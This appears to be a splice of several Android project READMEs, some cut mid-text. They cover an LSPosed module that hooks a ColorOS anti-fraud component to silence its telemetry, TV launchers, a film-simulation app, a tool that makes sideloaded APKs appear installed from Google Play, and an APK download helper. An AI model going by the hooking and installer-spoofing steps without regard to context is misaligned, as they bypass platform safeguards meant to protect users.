/ Static scope: yes / User 0: enabled /data/adb/modules/zygisk_lsposed/lspctl scope list com.eta.afb # 0 com.coloros.phonemanager # 看是否真的挂上 logcat -s AntiFraudBlock:* ``` 正常输出： ```text I AntiFraudBlock: module loaded, api=102 framework=LSPosed I AntiFraudBlock: attach com.coloros.phonemanager I AntiFraudBlock: com.oplus.phonemanager.aivoicecalldetect.utils.AiDetectStatistics -> 9 method(s) silenced I AntiFraudBlock: com.oplus.phonemanager.aivoicecalldetect.utils.AiVoiceDetectDCSUtils -> 2 method(s) silenced I AntiFraudBlock: TrackApi.E -> 1 sink hooked I AntiFraudBlock: kept local: insertFraudDetectSecurityEvent / showRiskNotification / FraudRiskDialogActivity I AntiFraudBlock: hit silence ...AiDetectStatistics#h/3 ← 真实命中 ``` ### 逃生阀 ```bash touch /data/local/tmp/afb.disable # 本次注入全部空转 am force-stop com.coloros.phonemanager ``` 删掉文件再强停一次即恢复阻断。用来快速做 A/B 对照。 --- ## 自测：确认拦截真的生效 ```bash ./selftest.sh # 只检查装配与本地功能（不动屏幕） ./selftest.sh --active # 额外打开反诈页产生真实事件 ``` 脚本在设备上 root shell 里跑（`adb shell sh /path/selftest.sh`），做三段检查，全过退出码 0： **A. 装配** —— `lspctl` 查模块启用状态与作用域；强停手机管家后冷启动，轮询 logcat 最多 15 秒，核对三处 hook 是否都报告就位。 **B. 拦截** —— 打开 `SecurityHomeActivity`，统计 `hit silence` 行数。实测样例： ```text OK 命中 1 次拦截 11-04 14:16:54.390 7216 7216 I AntiFraudBlock: hit silence com.oplus.phonemanager.aivoicecalldetect.utils.AiDetectStatistics#h/3 sink 层吞掉的 TrackApi 事件：0 条 （为 0 说明反诈埋点在 AiDetectStatistics 层就被挡在源头，根本没走到 TrackApi.E，属正常） ``` `sink 层 = 0` 是**预期**而不是故障：源头层已经短路，`TrackApi.E` 兜底层没机会触发。它只在手机管家换了新埋点入口、而事件名仍命中前缀时才会计数。 **C. 本地功能** —— 反诈页在任务栈存活、crash 缓冲区无手机管家记录、本地反诈配置文件仍在。 ### 两个真实踩过的坑（已在脚本里修掉） | 坑 | 症状 | 修法 | |---|---|---| | LSPosed 把模块日志镜像成 `LSPosedFramework` 行 | `grep -c` 把命中数算成 2 倍 | 计数前加 `grep -v LSPosedFramework` | | 冷启动 + 日志落盘有延迟，固定 `sleep 6` 不够 | 偶发 **A 段全 FAIL**，但 B 段能看到 `hit silence`（自相矛盾） | 改成轮询到出现 `kept local` 或超时 15 秒 | --- ## 构建 ```bash ./build.sh # -> out/AntiFraudBlock-2.0.apk

# 归藏电视 · GuiZang TV

> main 分支提供默认关闭的 [Codex 对话实验](docs/CODEX.md)：在「设置 → 实验性功能 → Codex 对话 → 开启」后显示入口，通过同一局域网电脑连接 Codex。以首页底部输入浮层呈现，带渐变模糊、彩色光效和胶囊消息；支持文字与系统输入法语音（需设备支持），尚未接入米家或个人日程。正式 v0.3.0 APK 不含此功能。

一个给国内小米电视做的简洁桌面：大字、壁纸、常用应用，以及直接进入游戏机和 Apple TV 的入口。

![归藏电视界面示意](docs/preview.svg)

**[下载 v0.3.0 APK](https://github.com/op7418/guizang-tv/releases/latest)** · [兼容性与验证](docs/COMPATIBILITY.md) · [代码 MIT 许可](LICENSE)

**v0.3.0：统一设置与全新 Dock。** 壁纸、布局、字体、焦点和首页编辑都在「设置」中；操作见 [设置指南](docs/SETTINGS.md)。横向 Dock 使用宽幅圆角毛玻璃底板和大图标，入口较多时随遥控器焦点平滑滚动。

项目背景见 **[v0.2.0 项目介绍与使用指南](docs/PROJECT-GUIDE.zh-CN.md)**：与 cleanYourTV、CleanFrame 的区别，实际改造与优势，安装、遥控器操作、壁纸设置和源码定制。

这是从个人电视上的定制版本整理出的公开版。目前重点适配小米电视 **MiTV-MTSU0**，不是面向所有 Android TV 的通用桌面替换工具。上图为布局示意；实际内置照片见 [壁纸预览与署名](docs/WALLPAPERS.md)。

**main 天气试用功能（尚未发布 APK）：** 时间右侧可显示天气，支持自动城市与手动选城。默认关闭，开启后联网；[试用说明与数据来源](docs/WEATHER.md)。正式下载仍为 v0.3.0。

## 能做什么

- 左侧大字列表：PlayStation 5、Apple TV、哔哩哔哩、小米投屏、相册、小米原桌面。
- 在已适配机型上，PlayStation 5 直达 HDMI 2，Apple TV 直达 HDMI 1。
- 操作区保留全部应用、其他信号源、设置（列表右下角，Dock 右上角）；壁纸统一进入「设置 → 背景」。
- 设置使用圆角选项与嵌入式首页预览；浏览壁纸时，预览和整页高斯模糊背景同步变化。
- 首页支持列表 / Dock、统一单色 SVG 图标 / 文字、字体风格与字号；毛玻璃焦点按内容宽度包裹，无长条描边。
- 首页 1–9 项，可添加、隐藏、排序和撤销编辑；默认六项不变。
- 壁纸支持固定选择、自动轮播，默认每 5 分钟切换；可选 1 / 5 / 15 / 30 分钟。
- 淡入淡出切换壁纸，离开桌面后暂停计时，返回后重新计时。
- 遥控器方向键操作，记住上次选中的入口和壁纸偏好。
- 基础桌面不需要账号或无障碍服务，不下载或预装视频 App。main 的可选天气和 Codex 实验默认关闭；后者需要电脑上的 Codex 登录及相应额度。v0.3.0 正式版仍不联网。
- 支持实验性开机自动进入：默认关闭，适配机型需先完成一次 ADB 配置，详见 [启用与恢复说明](docs/BOOT-START.md)。

公开版自带五张经过来源核对的 Unsplash 照片：雾中雪岭、雨林山路、热带绿叶、山间彩虹、流光花影。图片适用 [Unsplash License](https://unsplash.com/license)，代码适用 MIT；[完整来源与署名](docs/WALLPAPERS.md)随源码和 APK 保存。其余版权未确认的照片未纳入。也可以用自己的图片构建。

## 安装与使用

从 [Releases](https://github.com/op7418/guizang-tv/releases) 下载 APK，通过电视支持的本地安装方式安装。也可以在开启电视 ADB 调试、电脑连接同一网络后执行：

```sh
adb connect <电视IP>:5555
adb install -r guizang-tv-v0.3.0.apk
```

端口和调试方式取决于电视固件。首次连接请在电视上确认调试授权；使用结束后可以关闭调试。

安装后，在小米原桌面的应用列表中打开 **归藏电视**。

| 遥控器操作 | 行为 |
| --- | --- |
| 上 / 下 | 列表与其操作区切换项目；Dock 向上进入操作区，向下返回应用 |
| 右 | 列表进入操作区；Dock 向右选择应用 |
| 左 | 列表操作区返回上次应用；Dock 的应用和操作区均向左选择 |
| 确认 | 打开选中项目 |
| 返回 | 关闭面板；从操作区回到主列表；适配机型上从主列表回小米原桌面 |
| Home | 按系统原有设置工作，应用不拦截按键 |

**建议先作为普通应用试用。** 已测试的 HyperOS 固件会忽略第三方默认桌面选择，因此本项目不接管 Home 键。可在已适配机型上配置开机自动进入，需开启应用内开关并设置系统目标；这与默认桌面选择是两回事。无需禁用原桌面，小爱同学、手机投屏、直播及 HDMI 系统组件均保留。真实语音、投屏、直播播放仍需自行验证。

未配置开机自动进入时，卸载「归藏电视」即可结束试用。已经配置的用户先按 [关闭与恢复步骤](docs/BOOT-START.md) 停用并核对系统目标，避免缓存调用或降级旧版后行为变化。公开版包名为 `io.github.op7418.guizangtv`，不会覆盖上游 cleanYourTV，也不会覆盖原有私人试用版，设置不会自动迁移。

## 让 AI 帮你配置

可将本仓库交给 Codex、Claude Code 或其他 AI 编程助手。AI 入口是 [AGENTS.md](AGENTS.md) / [CLAUDE.md](CLAUDE.md)，完整流程见 [AI 适配与引导指南](docs/AI-SETUP.md)，涵盖其他安卓设备、Mac、Windows、Linux 电脑、配对、语音测试和故障定位。

可以直接说：

> 请阅读 AGENTS.md 和 docs/AI-SETUP.md，检查我的安卓设备与电脑环境，保留已有设置，指导我手动开启 Codex 实验并完成配对。先验证文字和重复进入，再测试语音；说明已通过和未验证的能力，不公开凭证。

目前完整实测组合是指定小米电视与 Mac。Windows/Linux 和其他安卓设备提供适配路径，尚不代表全面兼容；电脑运行连接服务，Android APK 不会因此变成电脑原生桌面。

## 从源码构建

要求：**JDK 17、Gradle 8.9、Android SDK Platform 34、Build Tools 34.0.0**。

仓库只包含源码；Gradle 请通过 [官方发行版](https://gradle.org/releases/) 安装。也可以用 Android Studio 打开项目，并选择本地 Gradle 8.9。

```sh
git clone https://github.com/op7418/guizang-tv.git
cd guizang-tv
export ANDROID_HOME=/path/to/Android/sdk
export JAVA_HOME=/path/to/jdk-17
gradle :app:assembleDebug :app:testDebugUnitTest :app:lintDebug
```

生成文件：`app/build/outputs/apk/debug/app-debug.apk`。首次构建需要联网下载 Android Gradle Plugin 和测试依赖，基础桌面离线可用；开启天气或 Codex 实验后，相应功能需要网络。

CI 会构建 Debug APK 并执行测试、lint；下载 Actions 产物需要登录 GitHub。Debug 包用于自行测试，不保证与 Releases 的正式签名兼容。

Release 构建：

```sh
gradle :app:assembleRelease :app:testReleaseUnitTest :app:lintRelease
```

未设置签名时输出未签名 APK。维护者可在本地配置 `GUIZANG_KEYSTORE`、`GUIZANG_STORE_PASSWORD`、`GUIZANG_KEY_ALIAS`（默认 `guizang-tv`）和 `GUIZANG_KEY_PASSWORD`（默认同 store password），再构建签名版本。密钥和密码不应提交到 Git。

## 使用自己的壁纸

目前支持**构建时打包**，电视端可以从已打包的图片中选择；尚未提供电视端文件导入功能。

准备 1–15 张 JPEG / PNG / WebP 图片，然后：

```sh
python3 -m venv .venv
.venv/bin/pip install Pillow
.venv/bin/python scripts/prepare_wallpapers.py /path/to/your/wallpapers
gradle :app:assembleDebug
```

脚本保留原图，为电视生成最长边 1920 像素的副本与缩略图，并去除 EXIF。生成内容放在 Git 忽略的 `app/src/main/assets/wallpapers/local/` 中。重新构建后，桌面会优先使用这组图片，内置照片仍随 APK 保留；文件名作为壁纸名称。请只分发有权公开使用的图片。

重复运行时，上一份生成结果会移到本地 `.wallpaper-backups/` 保留，避免旧照片混进新的安装包；备份目录也不进入 Git。

如需恢复默认的五张照片，将 `local/` 移到项目目录外备份，再重新构建。没有照片目录时会回退到五种渐变背景。

## 修改入口与适配电视

- 首页可在「设置 → 首页内容」编辑。默认名称、包名和顺序位于 [HomeItems.java](app/src/main/java/io/github/op7418/guizangtv/HomeItems.java)，应用启动由 FrameHomeActivity 处理。
- 小米接口集中在 [XiaomiControls.java](app/src/main/java/io/github/op7418/guizangtv/XiaomiControls.java)。HDMI 参数只在已验证机型上启用，不能仅添加机型名就视为完成适配。
- 分组设置位于 HomeSettings，首页及预览共用 HomeSurface；壁纸加载与轮播逻辑在 [FrameWallpapers.java](app/src/main/java/io/github/op7418/guizangtv/FrameWallpapers.java)。
- 当前 PS5 / Apple TV 是入口名称，不代表自动识别到设备。请按实际接线修改端口。
- 应用未安装时会显示提示；项目没有代装应用、账号登录或内容破解功能。

欢迎通过 Issue 提交电视型号、Android / 固件版本和复现步骤。请隐去局域网地址、序列号、账号及调试密钥。

## 来源与致谢

本项目起步于 [Gathin23/cleanyourtv](https://github.com/Gathin23/cleanyourtv) 的本地定制，整理时提取了本次实现的原生列表桌面及小米适配。公开版不包含上游

content.readme:
Quiet TV

一个简洁、可自定义的 Android 电视桌面。

常用应用、信号源、壁纸和应用管理，用遥控器轻松操作。
Android 原生界面，无广告、无推荐信息流，无需账号、root 或刷机。

## 界面

常用应用、时间与天气，首页一目了然。

经典布局与艺术画廊，设置实时预览。

每日壁纸自动更新，也可上传图片和视频。

自动定位或手动选城，天气来源按需选择。

应用分类筛选与详情，集中查看管理。

查看当前版本，一键检查应用更新。
## 功能 以下为 1.3.1 测试版的核心功能。下载以[实时发布索引](https://beatsad.github.io/quiet-tv/latest.json)为准，按电视系统与实际安装包选择适配版本。 | 功能 | 可以做什么 | | --- | --- | | 常用应用与排序 | 首页最多 5 个常用应用；长按移动、添加、替换、隐藏及发起卸载，隐藏应用可在应用管理恢复。 | | 桌面个性化 | 经典／艺术画廊布局，自定义问候语和头像，各项信息与快捷按钮独立显隐。 | | 天气 | 自动定位、手动选城和手机扫码选城，首页显示当地天气。 | | 壁纸 | 默认颜色主题、必应每日壁纸、自定义图片和视频；胶囊下拉设置轮播频率，视频声音开关，手机上传可改名。 | | 桌面屏保 | 与壁纸共用素材，独立选择屏保、空闲进入时间，以及时间和天气显示。 | | 文件传输 | 进入自动开启局域网收发，浏览本地与 U 盘，预览并导入壁纸；来源方向键直接切换。 | | 应用管理 | 分类筛选、应用详情、自定义封面；本机 TCP ADB 连接后，按规则和固件能力提供禁用、重新启用、卸载与恢复安装。 | | 儿童模式 | 隐藏或锁定应用、设置单次或每日使用时长，家长验证与到时休息提醒。 | | 应用自启 | 开机或待机唤醒进入 Quiet TV 后启动指定应用，按 HOME 返回不重复启动。 | | 信号源与桌面配置 | 按本机能力打开输入和系统设置；电脑 AI 配置默认桌面或兼容接管，保留原桌面恢复路径。 | | 应用内更新 | 检查版本、多源下载、完整性与签名校验，由用户确认安装。 | | 遥控器与本地使用 | 方向键、确定、返回操作，可选按键音；电脑 AI 可按实际能力逐键校准，无需云端账号。 | 从“全部应用 → 桌面设置”进入“桌面显示／看电视／天气设置／应用管理／儿童模式／文件传输／版本更新／诊断日志”。日常桌面、排序、壁纸、天气和封面设置无需 ADB。开发源码新增“看电视 → 搜索与配对”，可用遥控器检测、试开并保存信号源，电脑 AI 使用同一套维护接口；ADB 路径复用已授权的本机连接，未知协议通过辅助识别生成反馈。此能力尚未打包或进行厂商真机验收，详见[信号源配置](docs/agent/inputs.md)。首次桌面接管、必要连接准备、未知固件调查与开机广告处理仍由电脑 AI 按需执行；电视端保留已配置的本机 TCP ADB 日常管理，不提供无线配对界面，电脑已连接不代表应用已获授权。详见[应用管理](docs/APP_MANAGEMENT.md)。 1.3.1 新增文件传输、独立屏保、顶部轮播频率、手机上传改名和首页长按管理，完善电脑校准与维护；修正壁纸选择、家长验证、儿童计时状态和安装预检，改善视频资源交接与返回桌面黑闪。完整内容见 [1.3.1 Release](https://github.com/BeatsAD/quiet-tv/releases/tag/v1.3.1)。 应用内更新清单已上线，首页前台每 24 小时自动检查，可在“桌面设置 → 版本更新 → 检查更新”主动查询（1.3.0 入口为“应用管理”，更旧版本为“关于”）。旧版没有更新入口时先手动安装；同版本不会因构建号不同重复提示升级。详见[应用内更新](docs/UPDATES.md)。 ## 安装方式 ### 1. 使用 Skill 安装仓库中的[电视桌面切换助手](skills/quiet-tv-switch/SKILL.md)，在支持 Skill 和终端操作的 AI 工具中输入： ```text 请用 $quiet-tv-switch 帮我安装 Quiet TV 并切换电视桌面，保留原桌面和恢复方法。 ``` ### 2. 使用安装指令 打开[安装指引](https://beatsad.github.io/quiet-tv/)，复制唯一 AI 指令，交给电脑上的 AI 工具执行。安装、升级、修复共用[统一入口](docs/AGENT.md)，恢复时补充“恢复原桌面”；中断后提供原任务目录继续。页面会自动读取[最新版索引](https://beatsad.github.io/quiet-tv/latest.json)，无需填写版本号或随新版本修改指令。

content.readme:
# SpektraLab for Android

把 [SpektraLab](https://github.com/JamesQiu2005/SpektraLab) 的胶片／相纸模拟引擎搬到 Android 的移植。
打开一张 RAW，选胶片和相纸，得到一张按物理过程算出来的照片：81 个波长（380–780 nm，5 nm 步长）
穿过三层染料，颗粒按像素微米尺度播种，光晕、成色剂耦合、放大机染料的相互抑制各自建模。
**不是套 LUT。**

> 社区移植，不是上游官方版本。这份 C++ 引擎来自 SpektraLab 的 `assist/vulkan-engine-1.3.4`
> （commit `445e314`），而它是 [spektrafilm](https://github.com/andreavolpato/spektrafilm)
> 那个引擎的 C++/Metal 原生移植。来历见文末「致谢与许可」。

**下载** · [官网](https://spektralab.workshop.skin/) · [直链](https://spektralab.workshop.skin/download) · [Releases](https://github.com/SAINTTaiYi/SpektraLab-Android/releases)

**当前版本** `1.6.2m (385)` · arm64-v8a · minSdk 24 · 约 15.9 MB · GPL-3.0-or-later

## 能做什么

| | |
|---|---|
| 胶片／相纸 | 25 款胶片、9 款相纸，运行时从资源目录读取；黑白片自动配 Ilford，电影卷自动配 2383 |
| RAW 解码 | 原生 LibRaw。CR2／NEF／ARW／RW2／RAF／DNG 等；尼康 HE／HE★ 明确报 `E-1108` 并说明怎么改相机设置，不用内嵌 JPEG 糊弄 |
| 画幅 | 135 全画幅／半格／XPan、645、6×6、6×7、6×8、6×9、6×12、6×17，各自带真实片门尺寸 |
| 片边 | 齿孔、片夹、雾、漏光、张数、厂标、DX 条码；模式 strip／filed；画幅与片门绑定 |
| 日期水印 | LCD／点阵／数据背三种样式，可在画布上直接拖动定位 |
| 实时预览 | 拖参数约 **70 ms** 一帧（重印层 16 ms），松手再算全尺寸 |
| 导出 | JPEG／TIFF（16 位 + sRGB ICC）／DNG（线性 16 位，给电脑上的 Lightroom／ACR）；三档尺寸 |
| 构图 | 按片边比例一键裁切、±45° 任意角度旋转、四个方向的 90° 与翻转 |
| 批量 | 批量导入、批量导出（可中途停止）、批量删除 |
| 预设 | 保存、分享成一段文本、从剪贴板导入；也能把当前参数一键套用到其它照片 |
| 测光 | 7 种方式可选；「配光」按钮重新测光并显示三色滤镜结果 |
| 撤销 | 最多 400 步 |

## 这一版（1.6.2m）修了什么

- **片边文字**：全尺寸导出有，预览和竖幅照片也有。之前预览尺寸下笔画只剩 1–2 px、
  断成点被当成「刻度尺」，此前的处理是干脆不画；现在改成把笔画加粗 1 px 留着字。
- **导出花屏**：整幅变成噪声那种。现在导出完会拿成品和画布做灰度相关（正常 ≈0.97），
  不合格就不报「已保存」，并自动重导一次。
- **旋转松手跳回原位**：提交时快照几何，渲染线程不再读到被清零的字段。
- 竖幅片边空白、套用预设带着上一张的片门、批量导出后报错、批量导出途中点缩略图崩溃、
  小尺寸照片导入后无限闪退、切换界面必崩、Mali-G76／Adreno 630 完全无法渲染。

完整清单见 [Releases](https://github.com/SAINTTaiYi/SpektraLab-Android/releases)。

## 在手机上真正难的三件事

**1. 驱动只肯一次绑 128 MiB。**
遥测里 34.5% 的设备（几乎全是 Adreno 7xx）`maxStorageBufferRange` 只有 128 MiB，
而一张 20 MP 的中间平面就是 240 MB。做法是给每个 kernel 的绑定加窗口
（`dispatch_window(kernel, args, n, origin, read_bias)`），按行带发射，push constant 带基址。
分带与整块**逐字节相同**：63／64／65／100 宽 × 1／8／32 行全程验证，77 MP 片边画布
（9134×8435）在这类机型上也能跑完，峰值 1335 MiB。
顺带把导入预算从 8.95 MP 放开到约 32 MP（此后由可用内存决定，不再由绑定上限决定）。

**2. 一次 dispatch 不能超过 65 535 个 workgroup。**
超了这块驱动会静默丢块——不是报错，是顶部若干行呈现未初始化显存。
`kDispatchElementWall = maxComputeWorkGroupCount[0] × 256`：Adreno 825 是 16,776,960 元素，
Mali-G925 报 1.1e12（一次就够，分带反而每带留一条缝）。所以片边四处手写分带全部改成
「装得下就不切」。

**3. 显存要自己管。**
池子是帧内复用的，`Gpu::alloc` 返回带引用计数的平面；导出结束后显式 `spk_trim_pool()`
把整幅中间产物还回去，否则下一次导出前系统会把桌面换出。
58 MP 片边画布（9102×6336）实测 **28.8 秒**、峰值 **1335 MiB**；20.9 MP 带片边导出
（5973×3222）渲染 10.1 秒。

## 已知限制

- **任意角度旋转在 `maxStorageBufferRange = 128 MiB` 的机型上会失败**（`E-1001`）。
  一个输出行要读源图的一条斜线，必然绑整张源。裁切、90° 与翻转不受影响。
- **对比度蒙版**（`contrast_mask_*`）上游 Vulkan 后端未移植，接口里显式拒绝，不静默忽略。
- **导出的 DNG 手机版 Lightroom 打不开**（Adobe 已知问题），定位是给电脑上的 Lr／ACR 用；
  手机端请导出 TIFF 后点「分享」发给 Lightroom。
- **Ilford 黑白纸不支持 EDR**（没有标定曲线），开关保留但对该纸不生效。
- **7 支胶片的色相校正被锁定**（Vision3 四支、CineStill 800T、Verita 200D、Pro 400H）：
  它们的绿区偏移在实测里方向与其它胶片相反，强行校正会更偏；可以关掉校正用原始色彩。
- 仓库不含约 30 MB 的二进制资源（光谱表、LUT、profile），见下面「构建」。

## 构建

前置：Termux（aarch64）、Android SDK 36 / NDK 28、上游引擎源码、约 15 GB 空闲。

```bash
# 1) 上游引擎 + 本项目的 Android 补丁
git clone https://github.com/JamesQiu2005/SpektraLab
cd SpektraLab && git checkout 445e314
git apply /path/to/patches/engine-android.patch

# 2) 资源：把 engine/resources/ 下的 profiles/、vulkan/、DI/、*.bin、*.json
#    拷到 app/src/main/assets/resources/

# 3) 五步构建，顺序不能省
bash app/build/build-engine.sh     # 引擎 TU（改过头文件会自动全量重编）
bash app/build/build-native.sh     # 两个 JNI → .so
bash app/build/build-libs.sh       # staging 依赖库 + SONAME 等长改名
bash app/build/build-dex.sh        # javac → d8
bash build-apk.sh                  # aapt2 + 签名 + 依赖闭包检查
```

`build-libs.sh` 会把 `libjpeg.so.8` / `libz.so.1` 改名成 `libjpeg_8.so` / `libz_1.so`
并就地改写 `.dynstr`：AOSP 的安装器只解压 `lib/` 下以 `.so` 结尾的条目，带版本号的名字
会被静默跳过，然后在 `dlopen` 时报缺库。`check-libs.py` 会遍历每个 `.so` 的 `DT_NEEDED`
阻止这种包被打出来。

## 目录

| 路径 | 内容 |
|---|---|
| `app/src/main/java/app/spektralab/` | Activity（UI 全部手写，无 AppCompat）、引擎 Java 门面、调试上报 |
| `app/src/main/cpp/` | JNI：会话、渲染、导出（libjpeg 直写 + ICC／EXIF）、RAW 打开 |
| `app/build/` | 引擎对象、JNI、依赖库、dex 的构建脚本 |
| `patches/engine-android.patch` | 对上游引擎的改动 |
| `docs/` | 分块渲染设计（`tiling.md`）等 |
| `build-apk.sh` | aapt2 + apksigner 打包 |

## 致谢与许可

这个引擎不是从零写的，它有明确的三段来历：

**1. 物理模型与数据 — [spektrafilm](https://github.com/andreavolpato/spektrafilm) by Andrea Volpato**
胶片过程模型、28 款实测彩色 profile、放大 LUT，原实现是 Python + Metal。
以 **CC BY-SA 4.0** 分发（见 `LICENSE-SPEKTRAFILM.txt`）。

**2. 原生移植 — [SpektraLab](https://github.com/JamesQiu2005/SpektraLab)**
把上面那个引擎重写成 C++ / Metal，并加上 macOS 应用；另有 4 款黑白 profile 由 Hanze Qiu 实测。
以 **GPL-3.0-or-later** 分发。本仓库的上游即其 `assist/vulkan-engine-1.3.4`（commit `445e314`）。

**3. Android / Vulkan 移植 — 本仓库**
Vulkan 后端、JNI、UI、分带渲染与显存管理、色相校正标定。同样以 **GPL-3.0-or-later** 分发。

引擎里的 `src/film`、`src/print`、`src/scan` 与 `resources/`（光谱表、profile、LUT）
保持上游原样；本仓库的改动集中在执行层——`src/gpu`、`src/pipeline` 的调度部分、
`src/shaders` 的索引与分带、`src/io` 的编码——共 64 个文件 / +8379 −731 行
（对比 `445e314` 可复验）。

代码以 **GPL-3.0-or-later** 分发（见 `LICENSE`）；

content.readme:
# UnknownAuto [![Download APK](https://img.shields.io/github/v/release/GitMag/UnknownAuto?label=download%20APK&logo=android&color=success)](https://github.com/GitMag/UnknownAuto/releases/latest) [![Support on Ko-fi](https://img.shields.io/badge/support-Ko--fi-FF5E5B?logo=ko-fi&logoColor=white)](https://ko-fi.com/forsblomdev) An open, offline tool that lets a **self‑built or sideloaded Android Auto app** actually run in the car. It installs an APK the way Android Auto requires — as if it came from Google Play — **entirely on the phone, no computer** (Android 11+). No internet, no account, no payment, no analytics. A free, open alternative to the proprietary *AA Enabler*.

## Why it's needed Android Auto won't run an app built with its Car App Library unless Android thinks the app was **installed from Google Play**. The developer "Unknown sources" switch doesn't change that. A normal sideload — `adb install`, a file manager, or Shizuku — is recorded as *not* from Play, so Android Auto quietly refuses the app. UnknownAuto fixes that record so the car accepts it. ## How it works Android remembers who installed each app, and that "installed from Google Play" mark can only be set **when the app is installed** — you can't change it afterwards, and a plain sideload can't set it at all. UnknownAuto uses **Shizuku** — which runs with the phone's "shell" privileges, the same ones a connected computer's `adb` has — to drive Android's own package installer and mark the install as coming from Google Play. The car then treats it as a real Play install. It's the same trick the proprietary AA Enabler uses, done openly and for free. Some Android 17 builds do it the other way round: they keep the mark only when UnknownAuto starts the installer itself. When an install comes out without the mark, UnknownAuto tries once more the other way (one more tap on **Update**) and remembers which way works on that phone. Start Shizuku so both ways are available. Android 14 and older also check the app that asked for the install, and refuse the shell itself. There Shizuku starts the installer on UnknownAuto's behalf, so UnknownAuto needs the **install unknown apps** permission for this too. If the install doesn't go through at all, for example a newer version or one signed with another key is already installed, UnknownAuto says so, and **Show details** includes the installer's own log lines, which is the most useful thing to paste into an issue. ## Install UnknownAuto Grab the latest **UnknownAuto APK** from the [latest release](https://github.com/GitMag/UnknownAuto/releases/latest) and open it on the phone — or build it yourself with plain Android SDK tools, no Gradle: ``` ./build.sh # build unknownauto.apk ./build.sh install # build, then install and open it ``` On first use, allow it to **install unknown apps** (it opens that settings screen for you). ## Set up Shizuku (once) UnknownAuto needs [Shizuku](https://shizuku.rikka.app/) running. Shizuku gets the same access a computer gets through USB debugging, but on Android 11+ the phone gives it that access itself, over **Wireless debugging**. So when Shizuku asks you to pair, you pair the phone **with itself**: there is no computer or second device involved. Wireless debugging only works while the phone is **connected to Wi‑Fi** (any network; it doesn't use the internet). 1. **Install Shizuku.** Tap **Install Shizuku** in UnknownAuto (it downloads the official app), or get Shizuku from Google Play. 2. **Turn on Developer options.** Settings → About phone → tap **Build number** seven times. (Samsung: About phone → Software information → Build number. Xiaomi: About phone → OS version or MIUI version.) 3. **Start pairing in Shizuku.** Open Shizuku and, under *Start via Wireless debugging*, tap **Pairing**. Allow notifications if it asks: you'll type the pairing code into a Shizuku notification. The notification says *Searching for pairing service*. 4. **Get a pairing code.** Open Developer options → **Wireless debugging** (usually Settings → System → Developer options; or search Settings for "Wireless debugging"). Turn on **Use wireless debugging** and allow it on this network, then tap **Pair device with pairing code**. A six‑digit code appears. **Leave this dialog open.** 5. **Type the code into the notification.** Pull down the notifications: Shizuku's notification now says *Pairing service found*. Tap **Enter pairing code**, type the six digits and send. It changes to **Pairing successful**. 6. **Start Shizuku.** Go back to Shizuku and tap **Start** (the button next to Pairing). A black screen with text opens for a moment and closes by itself; that's normal. Shizuku's main screen now says **Shizuku is running**. The first time you tap **Install** in UnknownAuto, Shizuku asks whether to allow UnknownAuto: choose **Allow all the time**.

# Morphe Download Helper

An unofficial Android helper app that downloads the original APK requested by [Morphe Manager](https://github.com/MorpheApp/morphe-manager) and hands it back through Morphe's open `DOWNLOAD_ORIGINAL_APK` intent contract. > **Unofficial:** this project is not affiliated with, endorsed by, or maintained by the > Morphe project. Morphe ships no helper of its own and does not endorse any helper. ## Setup Guide New to the helper? Follow the **[illustrated setup guide](GUIDE.md)** to enable it in Morphe, trust it, and optionally make Morphe open it automatically. ## Report an issue Found a bug or want a feature? Use the issue forms: - [Report a bug](https://github.com/GeneralZyonix/morphe-download-helper/issues/new?template=bug_report.yml) - [Request a feature](https://github.com/GeneralZyonix/morphe-download-helper/issues/new?template=feature_request.yml) Please include: - Helper version - Android version and device - Morphe version - The app and version being patched - The helper log if possible — open the helper and tap **Share log**, then attach `helper.log` to the issue ## Features - Receives the package, version, version codes, file type, ABIs, and fallback URL from Morphe. - Follows the same resolver link Morphe's own download dialog uses. - Falls back to APKMirror, APKPure, F-Droid, Aptoide, and Appteka for SnapTube. - Uses APKPure's numeric `versionCode` endpoint, so the exact requested build is downloaded instead of the latest version. - Supports APK, APKM, APKS, and XAPK when Morphe allows split archives. - Opens Uptodown or APKPure in an inline WebView when a site needs a browser check. - Returns a `content://` URI with read permission so Morphe can validate and use the file. - Rejects downloaded APKs whose package or version does not match the request. - Shows a dark, modern UI with a source list and clear limitations. - Shows per-source failure details and offers **Retry all sources**, **Retry failed sources**, **Copy details**, and the same **Download sources** manager used on the main screen. - Uses GitHub automatically: immediately when Morphe's resolver points to a release, or as the final fallback when normal APK sources fail. There is no separate GitHub button. - Remembers successful GitHub repositories, and lets you pin a repository to a package with an optional asset filter and **Try this repo first**. - Keeps a structured, human-readable diagnostic log that can be shared from the app. - Built-in update checker with a changelog screen: notify me, or install silently through Shizuku. Forks that use a different package name are supported with a configurable manager package, with an optional battery-optimization exemption. - Optional **VirusTotal hash check** before handing an APK to Morphe. Hash lookup is the default; uploading unknown files, always uploading, or falling back to upload when the lookup quota is exceeded are separate opt-in settings. - Settings for the download folder, retention, source order, and individual sources. - Saves downloaded APKs to `Downloads/Morphe Helper` by default on Android 10+, with internal, external, and custom-folder options. - Appteka is limited to SnapTube by default and carries a hazard warning. It is not recommended for other apps because Appteka hosts modded APKs. ## Screenshots | Launcher | Setup | Download | | --- | --- | --- | | ![Launcher screen](docs/screenshots/main-v1.4.png) | ![Helper setup](docs/screenshots/setup-v1.4.png) | ![Download screen](docs/screenshots/download-v1.4.png) | ## Download Grab the latest universal APK from the [Releases page](https://github.com/GeneralZyonix/morphe-download-helper/releases). The app is written in Java and contains no native libraries, so **one universal APK works on all CPU architectures** (arm64-v8a, armeabi-v7a, x86, x86_64) and on **Android 6.0+** (minSdk 23). Separate per-ABI APKs are not needed. > Release APKs are currently signed with the Android debug key so they can be sideloaded. > A proper release keystore can be added later for Play Store-style signing continuity. ## How it works Morphe sends an intent with the action `app.morphe.manager.action.DOWNLOAD_ORIGINAL_APK`. The helper: 1. Reads the request extras, including the package, version, numeric version codes, ABIs, file type, and fallback URL. 2. If a numeric `versionCode` is available, tries APKPure's direct endpoint first, then its API. 3. If APKPure does not have the build, asks Morphe's resolver API for the page Morphe would show. 4. تلفزيونك · UrTV

An Arabic home screen and a Saudi screensaver for Android TV / Google TV, and a safe speed-up.
Your AI agent sets it all up.

